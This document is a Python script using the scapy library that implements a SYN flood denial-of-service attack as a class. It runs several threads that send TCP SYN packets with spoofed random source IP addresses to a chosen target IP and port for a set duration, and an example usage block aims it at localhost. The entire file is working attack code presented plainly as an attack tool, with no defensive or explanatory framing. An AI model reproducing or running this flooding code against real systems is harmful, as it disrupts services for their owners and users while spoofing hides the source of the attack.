from scapy.all import *
import threading
import time
import random
from typing import List
import logging

class SYNFloodAttack:
    def __init__(self, target_ip: str, target_port: int = 80, num_threads: int = 10, duration: int = 60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.duration = duration
        self.is_attacking = False
        self.threads: List[threading.Thread] = []
        
        # Setup logging
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)

    def _generate_random_ip(self):
        """Generate a random source IP address"""
        return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def _attack_thread(self):
        """Individual attack thread that sends SYN packets"""
        while self.is_attacking:
            try:
                # Create IP layer with random source IP
                ip = IP(src=self._generate_random_ip(), dst=self.target_ip)
                
                # Create TCP layer with SYN flag
                tcp = TCP(
                    sport=random.randint(1024, 65535),  # Random source port
                    dport=self.target_port,
                    flags="S",  # SYN flag
                    seq=random.randint(0, 65535)
                )
                
                # Send the packet
                send(ip/tcp, verbose=0)
                self.logger.debug(f"SYN packet sent to {self.target_ip}:{self.target_port}")
                
            except Exception as e:
                self.logger.error(f"Failed to send SYN packet: {str(e)}")
            
            # Small delay to prevent overwhelming the local machine
            time.sleep(0.01)

    def start(self):
        """Start the SYN flood attack"""
        self.is_attacking = True
        self.logger.info(f"Starting SYN flood attack on {self.target_ip}:{self.target_port}")
        self.logger.info(f"Launching {self.num_threads} attack threads")
        
        # Create and start threads
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self._attack_thread)
            thread.daemon = True
            self.threads.append(thread)
            thread.start()
        
        # Set timer to stop attack
        threading.Timer(self.duration, self.stop).start()

    def stop(self):
        """Stop the SYN flood attack"""
        self.is_attacking = False
        self.logger.info("Stopping SYN flood attack")
        
        # Wait for all threads to complete
        for thread in self.threads:
            thread.join()
        
        self.threads.clear()
        self.logger.info("Attack stopped")

if __name__ == "__main__":
    # Example usage
    target = "127.0.0.1"
    attack = SYNFloodAttack(target_ip=target, target_port=80, num_threads=5, duration=30)
    attack.start() 